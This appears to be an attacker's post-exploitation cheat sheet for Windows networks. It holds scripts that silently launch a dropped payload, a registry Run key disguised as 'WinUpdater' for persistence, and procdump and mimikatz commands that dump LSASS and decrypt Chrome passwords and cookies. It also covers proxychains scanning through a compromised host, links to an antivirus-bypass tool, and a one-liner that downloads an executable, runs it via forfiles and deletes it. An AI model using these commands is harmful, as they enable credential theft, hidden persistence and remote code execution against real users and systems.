
<p align="center">
  <body>
    <img src="2zHQ.gif" width="500" height="300">
  </body>
</p>
````
Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0
Set WinScriptHost = Nothing
````
````
WScript.Sleep(5000):Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run("start C:\Users\Public\putty.exe"), 0, True

````

````
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"
````

````
aHR0cHM6Ly9zZWMubm1hc2suY24vYXJ0aWNsZV9jb250ZW50P2FfaWQ9YWQ1ZWI3NzQ1NDMxYzk4YzRiN2QxZWYyNzc0ZjI2NGI=

````
Анализируйте запросы ARP для определения взаимодействующих хостов и устаревших конфигураций сетевых адресов (SNAC)
https://github.com/arch4ngel/eavesarp


## make proxy in target PC

https://www.youtube.com/watch?v=ghZ8XK9zEfI<br>
proxy UP &
````
vim /etc/proxychains4.conf
proxychains4 nmap -A -F -sT -Pn 10.10.10.1/24 > nmap_res.txt
````


````
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmpsekurlsa::dpapi

````
## Mimikatz Chrome-dump

````
mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotectbeacon> mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
````
### Chrome cookies

````
 dpapi::chrome /in:"%localappdata%GoogleChromeUser DataDefaultCookies" /unprotect
````



## Download with Powershell

https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

https://adamtheautomator.com/powershell-download-file/


````
Invoke-WebRequest -Uri $url -OutFile $output
````

````
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
````

bYpASS

https://github.com/tokyoneon/Chimera



````
powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
````
